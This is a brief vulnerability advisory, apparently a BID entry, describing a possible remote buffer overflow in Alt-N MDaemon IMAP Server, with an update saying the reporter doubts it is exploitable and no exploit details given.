Alt-N MDaemon IMAP Server is susceptible to a remote buffer-overflow vulnerability. This issue is due to the application's failure to properly bounds-check user-supplied input before copying it to an insufficiently sized memory buffer.

This issue allows remote, unauthenticated attackers to execute arbitrary machine code in the context of affected servers. This facilitates the complete compromise of affected computers.

Specific information regarding affected versions is not currently available. This BID will be updated as further information is disclosed.

UPDATE: The reporter of this issue states that this issue may not be exploitable. This BID may be retired in the future.
